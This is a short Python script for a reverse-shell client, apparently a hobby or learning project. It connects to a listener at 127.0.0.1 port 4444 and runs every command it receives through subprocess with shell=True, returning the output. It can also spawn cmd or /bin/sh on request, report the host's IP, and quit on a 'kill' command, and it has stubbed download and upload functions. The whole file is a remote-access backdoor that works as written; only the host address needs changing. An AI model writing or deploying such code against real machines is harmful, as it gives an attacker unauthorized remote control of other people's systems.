import os
import socket
import subprocess
import threading

IP = "127.0.0.1"
PORT = 4444

def execute_command(cmd):
    """Executes received commands and returns the output."""
    try:
        if cmd.lower() == "opencmd":
            if os.name == "nt":
                return subprocess.Popen(["cmd"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
               return subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        elif cmd.lower() == "getip":
            return socket.gethostbyname(socket.gethostname())

        elif cmd.lower() == "download":
            return f"{cmd} functionality to be implemented later."
        
        elif cmd.lower() == "upload":
            return f"{cmd} functionality to be implemented later."

        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr

    except Exception as e:
        return f"Error: {e}"

def handle_server_commands(sock):
    """Receives commands from server and sends back output."""
    while True:
        try:
            cmd = sock.recv(1024).decode().strip()
            if not cmd:
                continue

            if cmd.lower() == "kill":
                sock.close()
                break

            output = execute_command(cmd)
            sock.sendall(output.encode())

        except Exception as e:
            sock.sendall(f"Error: {e}".encode())
            break

def start_client(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))

        print(f"Connected to {ip}:{port}")

        thread = threading.Thread(target=handle_server_commands, args=(sock,))
        thread.daemon = True
        thread.start()

        thread.join()
    except KeyboardInterrupt:
        sock.close()

if __name__ == "__main__":
    start_client(IP, PORT)
